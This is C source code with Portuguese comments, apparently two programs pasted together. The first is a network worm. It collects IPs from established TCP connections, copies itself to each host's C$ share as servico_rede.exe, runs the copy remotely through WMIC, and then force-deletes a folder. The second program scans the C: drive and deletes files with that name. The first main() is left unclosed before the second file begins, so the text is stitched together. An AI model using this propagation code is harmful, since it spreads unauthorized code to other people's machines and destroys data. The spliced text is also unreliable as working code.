#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Função para buscar IPs e tentar a propagação
void propagar_na_rede(const char *meu_executavel) {
    printf("\n--- Buscando Alvos e Tentando Propagacao ---\n");
    
    // Comando PowerShell: Lista IPs remotos de conexões estabelecidas
    const char *comando_ps = "powershell.exe -Command \"(Get-NetTCPConnection -State Established).RemoteAddress | Select-Object -Unique\"";
    
    FILE *fp = popen(comando_ps, "r");
    if (fp == NULL) {
        printf("Erro ao executar o PowerShell para buscar IPs.\n");
        return;
    }

    char ip_destino[64];
    
    while (fgets(ip_destino, sizeof(ip_destino), fp) != NULL) {
        ip_destino[strcspn(ip_destino, "\r\n")] = 0;

        if (strlen(ip_destino) > 7 && strcmp(ip_destino, "127.0.0.1") != 0 && strcmp(ip_destino, "0.0.0.0") != 0) {
            printf("\n[+] Alvo encontrado: %s\n", ip_destino);
            
            char comando_copia[512];
            char comando_execucao[512];

            // 1. Tenta copiar o executável para o destino
            snprintf(comando_copia, sizeof(comando_copia), "copy \"%s\" \\\\%s\\C$\\Windows\\Temp\\servico_rede.exe", meu_executavel, ip_destino);
            printf("Copiando para o alvo...\n");
            int res_copia = system(comando_copia);

            if (res_copia == 0) {
                printf("Copia concluida. Tentando execucao remota...\n");
                
                // 2. Execução remota via WMIC
                snprintf(comando_execucao, sizeof(comando_execucao), "wmic /node:%s process call create \"C:\\Windows\\Temp\\servico_rede.exe\"", ip_destino);
                system(comando_execucao);
                
                printf("Comando de execucao enviado para %s.\n", ip_destino);
            } else {
                printf("Falha ao acessar a maquina %s.\n", ip_destino);
            }
        }
    }
    pclose(fp);
}

int main(int argc, char *argv[]) {
    // argv[0] contém o caminho do próprio executável
    const char *meu_executavel = argv[0];

    printf("Iniciando processo local: %s\n", meu_executavel);

    // 1. Executa a lógica principal (Propagação)
    propagar_na_rede(meu_executavel);

    // 2. Após terminar a lógica, executa o comando de remoção da pasta
    printf("\n--- Iniciando Limpeza de Pasta ---\n");
    
    // IMPORTANTE: Altere o caminho abaixo para a pasta real que deseja deletar
    const char *pasta_para_deletar = "C:\\Caminho\\Para\\Sua\\Pasta";
    
    char comando_limpeza[512];
    snprintf(comando_limpeza, sizeof(comando_limpeza), 
             "powershell.exe -Command \"Remove-Item -Path '%s' -Recurse -Force\"", 
             pasta_para_deletar);

    // Executa a remoção
    int status = system(comando_limpeza);

    if (status == 0) {
        printf("Pasta removida com sucesso.\n");
    } else {
        printf("Erro ao tentar remover a pasta. Verifique permissões de Administrador.\n");
    }
#include <stdio.h>
#include <string.h>
#include <windows.h>

// Função recursiva usando a API do Windows
void search_and_delete(const char *dir_path, const char *target_filename) {
    char search_path[MAX_PATH];
    WIN32_FIND_DATA find_file_data;
    HANDLE hFind;

    // Monta o caminho de busca para a API do Windows (ex: "C:\Caminho\*")
    snprintf(search_path, sizeof(search_path), "%s\\*", dir_path);

    // Inicia a busca no diretório atual
    hFind = FindFirstFile(search_path, &find_file_data);

    // Se der erro (ex: pasta bloqueada pelo sistema), simplesmente ignora e sai
    if (hFind == INVALID_HANDLE_VALUE) {
        return; 
    }

    do {
        // Ignora as referências de pasta atual "." e pasta pai ".."
        if (strcmp(find_file_data.cFileName, ".") == 0 || strcmp(find_file_data.cFileName, "..") == 0) {
            continue;
        }

        // Monta o caminho completo do item encontrado
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\%s", dir_path, find_file_data.cFileName);

        // Verifica se o item encontrado é uma pasta
        if (find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // É pasta: chama a função de novo (recursividade) para entrar nela
            search_and_delete(path, target_filename);
        } else {
            // É arquivo: verifica se o nome bate com o nosso alvo
            if (strcmp(find_file_data.cFileName, target_filename) == 0) {
                printf("[!] Arquivo encontrado: %s\n", path);
                
                // Tenta deletar usando a função nativa do Windows
                if (DeleteFile(path)) {
                    printf("    -> Deletado com sucesso!\n");
                } else {
                    printf("    -> Erro ao deletar (Pode estar em uso ou sem permissao de Administrador)\n");
                }
            }
        }
    } while (FindNextFile(hFind, &find_file_data) != 0); // Continua até acabar os itens da pasta

    FindClose(hFind);
}

int main() {
    // Definimos o alvo e a raiz da busca direto no código
    const char *target = "servico_rede.exe";
    const char *root_dir = "C:"; // Começa no disco C inteiro

    printf("Iniciando varredura no disco %s procurando por '%s'...\n", root_dir, target);
    printf("Isso pode levar alguns minutos. Aguarde...\n\n");
    
    // Chama a função
    search_and_delete(root_dir, target);
    
    printf("\nVarredura concluida. Pode fechar o programa.\n");
    system("pause"); // Pausa a tela para você conseguir ler o resultado antes de fechar
    
    return 0;
}